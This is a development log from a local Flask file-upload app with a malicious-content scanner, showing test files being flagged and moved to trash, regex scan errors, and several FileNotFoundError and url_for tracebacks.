2025-02-22 17:53:26,054 - Malicious pattern detected in uploads/test/test/3.py
2025-02-22 17:53:26,054 - Moved 3.py to trash due to suspicious content.
2025-02-22 17:53:26,054 - Malicious pattern detected in uploads/test/test/4.php
2025-02-22 17:53:26,054 - Moved 4.php to trash due to suspicious content.
2025-02-22 17:53:26,054 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 17:53:26,054 - Moved 1.sql to trash due to suspicious content.
2025-02-22 17:53:26,055 - Malicious pattern detected in uploads/test/test/2.xss
2025-02-22 17:53:26,055 - Moved 2.xss to trash due to suspicious content.
2025-02-22 17:53:26,055 - Malicious pattern detected in uploads/test/test/6.js
2025-02-22 17:53:26,055 - Moved 6.js to trash due to suspicious content.
2025-02-22 17:53:26,056 - Malicious pattern detected in uploads/test/test/5.txt
2025-02-22 17:53:26,056 - Moved 5.txt to trash due to suspicious content.
2025-02-22 17:53:26,059 - 127.0.0.1 - - [22/Feb/2025 17:53:26] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 17:53:26,064 - 127.0.0.1 - - [22/Feb/2025 17:53:26] "GET / HTTP/1.1" 200 -
2025-02-22 17:56:41,104 - Error scanning uploads/5-A.R: missing ), unterminated subpattern at position 17
2025-02-22 17:56:41,123 - Error scanning uploads/C-Class-shaktiweek2019.pdf: missing ), unterminated subpattern at position 17
2025-02-22 17:56:41,123 - Error scanning uploads/w.js: missing ), unterminated subpattern at position 17
2025-02-22 17:56:41,123 - Error scanning uploads/mixed_cluster.bsv: missing ), unterminated subpattern at position 17
2025-02-22 17:56:41,123 - Error scanning uploads/a.py: missing ), unterminated subpattern at position 17
2025-02-22 17:56:41,123 - Error scanning uploads/test/test/1.zip: missing ), unterminated subpattern at position 17
2025-02-22 17:56:41,125 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 17:56:41,125 - [33mPress CTRL+C to quit[0m
2025-02-22 17:56:45,475 - 127.0.0.1 - - [22/Feb/2025 17:56:45] "GET / HTTP/1.1" 200 -
2025-02-22 17:57:25,229 - Error scanning uploads/input_detail.yaml: missing ), unterminated subpattern at position 17
2025-02-22 17:57:25,232 - 127.0.0.1 - - [22/Feb/2025 17:57:25] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 17:57:25,238 - 127.0.0.1 - - [22/Feb/2025 17:57:25] "GET / HTTP/1.1" 200 -
2025-02-22 17:57:36,190 - Exception on /upload-folder [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 126, in upload_folder
    file.save(filepath)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/datastructures/file_storage.py", line 125, in save
    dst = open(dst, "wb")
FileNotFoundError: [Errno 2] No such file or directory: 'uploads/pre-yaml/pre-yaml/gen.yaml'
2025-02-22 17:57:36,192 - 127.0.0.1 - - [22/Feb/2025 17:57:36] "[35m[1mPOST /upload-folder HTTP/1.1[0m" 500 -
2025-02-22 17:57:38,143 - 127.0.0.1 - - [22/Feb/2025 17:57:38] "GET / HTTP/1.1" 200 -
2025-02-22 17:57:41,956 - Exception on /upload-folder [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 126, in upload_folder
    file.save(filepath)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/datastructures/file_storage.py", line 125, in save
    dst = open(dst, "wb")
FileNotFoundError: [Errno 2] No such file or directory: 'uploads/pre-yaml/pre-yaml/gen.yaml'
2025-02-22 17:57:41,957 - 127.0.0.1 - - [22/Feb/2025 17:57:41] "[35m[1mPOST /upload-folder HTTP/1.1[0m" 500 -
2025-02-22 17:58:01,531 - Exception on /upload-folder [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 126, in upload_folder
    file.save(filepath)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/datastructures/file_storage.py", line 125, in save
    dst = open(dst, "wb")
FileNotFoundError: [Errno 2] No such file or directory: 'uploads/uploads/uploads/input_detail.yaml'
2025-02-22 17:58:01,532 - 127.0.0.1 - - [22/Feb/2025 17:58:01] "[35m[1mPOST /upload-folder HTTP/1.1[0m" 500 -
2025-02-22 17:58:04,542 - 127.0.0.1 - - [22/Feb/2025 17:58:04] "GET / HTTP/1.1" 200 -
2025-02-22 17:58:15,163 - Error scanning uploads/test/test/3.py: missing ), unterminated subpattern at position 17
2025-02-22 17:58:15,163 - Error scanning uploads/test/test/4.php: missing ), unterminated subpattern at position 17
2025-02-22 17:58:15,163 - Error scanning uploads/test/test/1.sql: missing ), unterminated subpattern at position 17
2025-02-22 17:58:15,163 - Error scanning uploads/test/test/2.xss: missing ), unterminated subpattern at position 17
2025-02-22 17:58:15,164 - Error scanning uploads/test/test/6.js: missing ), unterminated subpattern at position 17
2025-02-22 17:58:15,164 - Error scanning uploads/test/test/5.txt: missing ), unterminated subpattern at position 17
2025-02-22 17:58:15,164 - Error scanning uploads/test/test/1.zip: missing ), unterminated subpattern at position 17
2025-02-22 17:58:15,164 - Error scanning uploads/test/test/3.py: missing ), unterminated subpattern at position 17
2025-02-22 17:58:15,164 - Error scanning uploads/test/test/4.php: missing ), unterminated subpattern at position 17
2025-02-22 17:58:15,165 - Error scanning uploads/test/test/1.sql: missing ), unterminated subpattern at position 17
2025-02-22 17:58:15,165 - Error scanning uploads/test/test/2.xss: missing ), unterminated subpattern at position 17
2025-02-22 17:58:15,165 - Error scanning uploads/test/test/6.js: missing ), unterminated subpattern at position 17
2025-02-22 17:58:15,165 - Error scanning uploads/test/test/5.txt: missing ), unterminated subpattern at position 17
2025-02-22 17:58:15,165 - Error scanning uploads/test/test/1.zip: missing ), unterminated subpattern at position 17
2025-02-22 17:58:15,166 - 127.0.0.1 - - [22/Feb/2025 17:58:15] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 17:58:15,171 - 127.0.0.1 - - [22/Feb/2025 17:58:15] "GET / HTTP/1.1" 200 -
2025-02-22 17:58:26,618 - Error scanning uploads/test/test/3.py: missing ), unterminated subpattern at position 17
2025-02-22 17:58:26,618 - Error scanning uploads/test/test/4.php: missing ), unterminated subpattern at position 17
2025-02-22 17:58:26,619 - Error scanning uploads/test/test/1.sql: missing ), unterminated subpattern at position 17
2025-02-22 17:58:26,619 - Error scanning uploads/test/test/2.xss: missing ), unterminated subpattern at position 17
2025-02-22 17:58:26,619 - Error scanning uploads/test/test/6.js: missing ), unterminated subpattern at position 17
2025-02-22 17:58:26,620 - Error scanning uploads/test/test/5.txt: missing ), unterminated subpattern at position 17
2025-02-22 17:58:26,620 - Error scanning uploads/test/test/1.zip: missing ), unterminated subpattern at position 17
2025-02-22 17:58:26,621 - Error scanning uploads/test/test/3.py: missing ), unterminated subpattern at position 17
2025-02-22 17:58:26,621 - Error scanning uploads/test/test/4.php: missing ), unterminated subpattern at position 17
2025-02-22 17:58:26,621 - Error scanning uploads/test/test/1.sql: missing ), unterminated subpattern at position 17
2025-02-22 17:58:26,621 - Error scanning uploads/test/test/2.xss: missing ), unterminated subpattern at position 17
2025-02-22 17:58:26,621 - Error scanning uploads/test/test/6.js: missing ), unterminated subpattern at position 17
2025-02-22 17:58:26,622 - Error scanning uploads/test/test/5.txt: missing ), unterminated subpattern at position 17
2025-02-22 17:58:26,622 - Error scanning uploads/test/test/1.zip: missing ), unterminated subpattern at position 17
2025-02-22 17:58:26,622 - 127.0.0.1 - - [22/Feb/2025 17:58:26] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 17:58:26,627 - 127.0.0.1 - - [22/Feb/2025 17:58:26] "GET / HTTP/1.1" 200 -
2025-02-22 17:58:30,021 - 127.0.0.1 - - [22/Feb/2025 17:58:30] "[32mGET /delete/19 HTTP/1.1[0m" 302 -
2025-02-22 17:58:30,026 - 127.0.0.1 - - [22/Feb/2025 17:58:30] "GET / HTTP/1.1" 200 -
2025-02-22 17:58:31,227 - 127.0.0.1 - - [22/Feb/2025 17:58:31] "[32mGET /delete/18 HTTP/1.1[0m" 302 -
2025-02-22 17:58:31,232 - 127.0.0.1 - - [22/Feb/2025 17:58:31] "GET / HTTP/1.1" 200 -
2025-02-22 17:58:32,440 - 127.0.0.1 - - [22/Feb/2025 17:58:32] "[32mGET /delete/17 HTTP/1.1[0m" 302 -
2025-02-22 17:58:32,444 - 127.0.0.1 - - [22/Feb/2025 17:58:32] "GET / HTTP/1.1" 200 -
2025-02-22 17:58:33,363 - 127.0.0.1 - - [22/Feb/2025 17:58:33] "[32mGET /delete/16 HTTP/1.1[0m" 302 -
2025-02-22 17:58:33,367 - 127.0.0.1 - - [22/Feb/2025 17:58:33] "GET / HTTP/1.1" 200 -
2025-02-22 17:58:34,232 - 127.0.0.1 - - [22/Feb/2025 17:58:34] "[32mGET /delete/15 HTTP/1.1[0m" 302 -
2025-02-22 17:58:34,237 - 127.0.0.1 - - [22/Feb/2025 17:58:34] "GET / HTTP/1.1" 200 -
2025-02-22 17:58:35,146 - 127.0.0.1 - - [22/Feb/2025 17:58:35] "[32mGET /delete/14 HTTP/1.1[0m" 302 -
2025-02-22 17:58:35,150 - 127.0.0.1 - - [22/Feb/2025 17:58:35] "GET / HTTP/1.1" 200 -
2025-02-22 17:58:36,209 - 127.0.0.1 - - [22/Feb/2025 17:58:36] "[32mGET /delete/13 HTTP/1.1[0m" 302 -
2025-02-22 17:58:36,214 - 127.0.0.1 - - [22/Feb/2025 17:58:36] "GET / HTTP/1.1" 200 -
2025-02-22 17:58:37,058 - 127.0.0.1 - - [22/Feb/2025 17:58:37] "[32mGET /delete/12 HTTP/1.1[0m" 302 -
2025-02-22 17:58:37,062 - 127.0.0.1 - - [22/Feb/2025 17:58:37] "GET / HTTP/1.1" 200 -
2025-02-22 17:58:38,005 - 127.0.0.1 - - [22/Feb/2025 17:58:38] "[32mGET /delete/11 HTTP/1.1[0m" 302 -
2025-02-22 17:58:38,010 - 127.0.0.1 - - [22/Feb/2025 17:58:38] "GET / HTTP/1.1" 200 -
2025-02-22 17:58:38,962 - 127.0.0.1 - - [22/Feb/2025 17:58:38] "[32mGET /delete/10 HTTP/1.1[0m" 302 -
2025-02-22 17:58:38,966 - 127.0.0.1 - - [22/Feb/2025 17:58:38] "GET / HTTP/1.1" 200 -
2025-02-22 17:58:39,996 - 127.0.0.1 - - [22/Feb/2025 17:58:39] "[32mGET /delete/8 HTTP/1.1[0m" 302 -
2025-02-22 17:58:40,002 - 127.0.0.1 - - [22/Feb/2025 17:58:40] "GET / HTTP/1.1" 200 -
2025-02-22 17:58:41,070 - 127.0.0.1 - - [22/Feb/2025 17:58:41] "[32mGET /delete/6 HTTP/1.1[0m" 302 -
2025-02-22 17:58:41,074 - 127.0.0.1 - - [22/Feb/2025 17:58:41] "GET / HTTP/1.1" 200 -
2025-02-22 17:58:42,017 - 127.0.0.1 - - [22/Feb/2025 17:58:42] "[32mGET /delete/5 HTTP/1.1[0m" 302 -
2025-02-22 17:58:42,021 - 127.0.0.1 - - [22/Feb/2025 17:58:42] "GET / HTTP/1.1" 200 -
2025-02-22 17:58:44,040 - 127.0.0.1 - - [22/Feb/2025 17:58:44] "[32mGET /delete/7 HTTP/1.1[0m" 302 -
2025-02-22 17:58:44,045 - 127.0.0.1 - - [22/Feb/2025 17:58:44] "GET / HTTP/1.1" 200 -
2025-02-22 17:58:53,533 - Error scanning uploads/test/test/3.py: missing ), unterminated subpattern at position 17
2025-02-22 17:58:53,533 - Error scanning uploads/test/test/4.php: missing ), unterminated subpattern at position 17
2025-02-22 17:58:53,533 - Error scanning uploads/test/test/1.sql: missing ), unterminated subpattern at position 17
2025-02-22 17:58:53,534 - Error scanning uploads/test/test/2.xss: missing ), unterminated subpattern at position 17
2025-02-22 17:58:53,534 - Error scanning uploads/test/test/6.js: missing ), unterminated subpattern at position 17
2025-02-22 17:58:53,534 - Error scanning uploads/test/test/5.txt: missing ), unterminated subpattern at position 17
2025-02-22 17:58:53,535 - Error scanning uploads/test/test/1.zip: missing ), unterminated subpattern at position 17
2025-02-22 17:58:53,535 - Error scanning uploads/test/test/3.py: missing ), unterminated subpattern at position 17
2025-02-22 17:58:53,535 - Error scanning uploads/test/test/4.php: missing ), unterminated subpattern at position 17
2025-02-22 17:58:53,535 - Error scanning uploads/test/test/1.sql: missing ), unterminated subpattern at position 17
2025-02-22 17:58:53,535 - Error scanning uploads/test/test/2.xss: missing ), unterminated subpattern at position 17
2025-02-22 17:58:53,535 - Error scanning uploads/test/test/6.js: missing ), unterminated subpattern at position 17
2025-02-22 17:58:53,536 - Error scanning uploads/test/test/5.txt: missing ), unterminated subpattern at position 17
2025-02-22 17:58:53,536 - Error scanning uploads/test/test/1.zip: missing ), unterminated subpattern at position 17
2025-02-22 17:58:53,536 - 127.0.0.1 - - [22/Feb/2025 17:58:53] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 17:58:53,540 - 127.0.0.1 - - [22/Feb/2025 17:58:53] "GET / HTTP/1.1" 200 -
2025-02-22 18:00:10,537 - Error scanning uploads/5-A.R: missing ), unterminated subpattern at position 17
2025-02-22 18:00:10,555 - Error scanning uploads/C-Class-shaktiweek2019.pdf: missing ), unterminated subpattern at position 17
2025-02-22 18:00:10,556 - Error scanning uploads/mixed_cluster.bsv: missing ), unterminated subpattern at position 17
2025-02-22 18:00:10,556 - Error scanning uploads/a.py: missing ), unterminated subpattern at position 17
2025-02-22 18:00:10,556 - Error scanning uploads/test/test/3.py: missing ), unterminated subpattern at position 17
2025-02-22 18:00:10,556 - Error scanning uploads/test/test/4.php: missing ), unterminated subpattern at position 17
2025-02-22 18:00:10,556 - Error scanning uploads/test/test/1.sql: missing ), unterminated subpattern at position 17
2025-02-22 18:00:10,556 - Error scanning uploads/test/test/2.xss: missing ), unterminated subpattern at position 17
2025-02-22 18:00:10,556 - Error scanning uploads/test/test/6.js: missing ), unterminated subpattern at position 17
2025-02-22 18:00:10,558 - Error scanning uploads/test/test/5.txt: missing ), unterminated subpattern at position 17
2025-02-22 18:00:10,558 - Error scanning uploads/test/test/1.zip: missing ), unterminated subpattern at position 17
2025-02-22 18:00:10,560 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 18:00:10,560 - [33mPress CTRL+C to quit[0m
2025-02-22 18:00:14,628 - 127.0.0.1 - - [22/Feb/2025 18:00:14] "GET / HTTP/1.1" 200 -
2025-02-22 18:00:24,007 - 127.0.0.1 - - [22/Feb/2025 18:00:24] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 18:00:24,012 - 127.0.0.1 - - [22/Feb/2025 18:00:24] "GET / HTTP/1.1" 200 -
2025-02-22 18:00:34,307 - 127.0.0.1 - - [22/Feb/2025 18:00:34] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 18:00:34,313 - 127.0.0.1 - - [22/Feb/2025 18:00:34] "GET / HTTP/1.1" 200 -
2025-02-22 18:02:30,288 - 127.0.0.1 - - [22/Feb/2025 18:02:30] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 18:02:30,292 - 127.0.0.1 - - [22/Feb/2025 18:02:30] "GET / HTTP/1.1" 200 -
2025-02-22 18:02:37,651 - 127.0.0.1 - - [22/Feb/2025 18:02:37] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 18:02:37,655 - 127.0.0.1 - - [22/Feb/2025 18:02:37] "GET / HTTP/1.1" 200 -
2025-02-22 18:02:40,025 - 127.0.0.1 - - [22/Feb/2025 18:02:40] "GET / HTTP/1.1" 200 -
2025-02-22 18:02:48,004 - Malicious pattern detected in uploads/test/test/3.py
2025-02-22 18:02:48,005 - Moved 3.py to trash due to suspicious content.
2025-02-22 18:02:54,001 - Malicious pattern detected in uploads/test/test/4.php
2025-02-22 18:02:54,001 - Moved 4.php to trash due to suspicious content.
2025-02-22 18:02:58,393 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 18:02:58,393 - Moved 1.sql to trash due to suspicious content.
2025-02-22 18:02:58,393 - Malicious pattern detected in uploads/test/test/2.xss
2025-02-22 18:02:58,393 - Moved 2.xss to trash due to suspicious content.
2025-02-22 18:02:58,393 - Malicious pattern detected in uploads/test/test/6.js
2025-02-22 18:02:58,393 - Moved 6.js to trash due to suspicious content.
2025-02-22 18:02:58,393 - Malicious pattern detected in uploads/test/test/5.txt
2025-02-22 18:02:58,393 - Moved 5.txt to trash due to suspicious content.
2025-02-22 18:02:58,395 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 18:02:58,395 - [33mPress CTRL+C to quit[0m
2025-02-22 18:03:01,623 - 127.0.0.1 - - [22/Feb/2025 18:03:01] "GET / HTTP/1.1" 200 -
2025-02-22 18:03:07,443 - 127.0.0.1 - - [22/Feb/2025 18:03:07] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 18:03:07,448 - 127.0.0.1 - - [22/Feb/2025 18:03:07] "GET / HTTP/1.1" 200 -
2025-02-22 18:03:20,096 - Exception on /upload-folder [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 133, in upload_folder
    file.save(filepath)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/datastructures/file_storage.py", line 125, in save
    dst = open(dst, "wb")
FileNotFoundError: [Errno 2] No such file or directory: 'uploads/new_test/new_test/HELLO.txt'
2025-02-22 18:03:20,098 - 127.0.0.1 - - [22/Feb/2025 18:03:20] "[35m[1mPOST /upload-folder HTTP/1.1[0m" 500 -
2025-02-22 18:03:21,820 - 127.0.0.1 - - [22/Feb/2025 18:03:21] "GET / HTTP/1.1" 200 -
2025-02-22 18:03:23,597 - Exception on /upload-folder [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 133, in upload_folder
    file.save(filepath)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/datastructures/file_storage.py", line 125, in save
    dst = open(dst, "wb")
FileNotFoundError: [Errno 2] No such file or directory: 'uploads/new_test/new_test/HELLO.txt'
2025-02-22 18:03:23,597 - 127.0.0.1 - - [22/Feb/2025 18:03:23] "[35m[1mPOST /upload-folder HTTP/1.1[0m" 500 -
2025-02-22 18:03:34,706 - Malicious pattern detected in uploads/test/test/3.py
2025-02-22 18:03:34,706 - Malicious pattern detected in uploads/test/test/4.php
2025-02-22 18:03:34,707 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 18:03:34,707 - Malicious pattern detected in uploads/test/test/2.xss
2025-02-22 18:03:34,707 - Malicious pattern detected in uploads/test/test/6.js
2025-02-22 18:03:34,707 - Malicious pattern detected in uploads/test/test/5.txt
2025-02-22 18:03:34,708 - 127.0.0.1 - - [22/Feb/2025 18:03:34] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 18:03:34,713 - 127.0.0.1 - - [22/Feb/2025 18:03:34] "GET / HTTP/1.1" 200 -
2025-02-22 18:03:52,876 - 127.0.0.1 - - [22/Feb/2025 18:03:52] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 18:03:52,880 - 127.0.0.1 - - [22/Feb/2025 18:03:52] "GET / HTTP/1.1" 200 -
2025-02-22 18:08:22,434 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 18:08:22,434 - [33mPress CTRL+C to quit[0m
2025-02-22 18:08:27,525 - 127.0.0.1 - - [22/Feb/2025 18:08:27] "GET / HTTP/1.1" 200 -
2025-02-22 18:08:35,075 - 127.0.0.1 - - [22/Feb/2025 18:08:35] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 18:08:35,080 - 127.0.0.1 - - [22/Feb/2025 18:08:35] "GET / HTTP/1.1" 200 -
2025-02-22 18:08:44,021 - 127.0.0.1 - - [22/Feb/2025 18:08:44] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 18:08:44,025 - 127.0.0.1 - - [22/Feb/2025 18:08:44] "GET / HTTP/1.1" 200 -
2025-02-22 18:08:56,245 - Exception on /upload-folder [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 201, in upload_folder
    file.save(filepath)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/datastructures/file_storage.py", line 125, in save
    dst = open(dst, "wb")
FileNotFoundError: [Errno 2] No such file or directory: 'uploads/new_test/new_test/HELLO.txt'
2025-02-22 18:08:56,246 - 127.0.0.1 - - [22/Feb/2025 18:08:56] "[35m[1mPOST /upload-folder HTTP/1.1[0m" 500 -
2025-02-22 18:08:57,960 - 127.0.0.1 - - [22/Feb/2025 18:08:57] "GET / HTTP/1.1" 200 -
2025-02-22 18:15:45,040 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 18:15:45,040 - [33mPress CTRL+C to quit[0m
2025-02-22 18:15:48,045 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 75, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 18:15:48,047 - 127.0.0.1 - - [22/Feb/2025 18:15:48] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:15:49,523 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 75, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
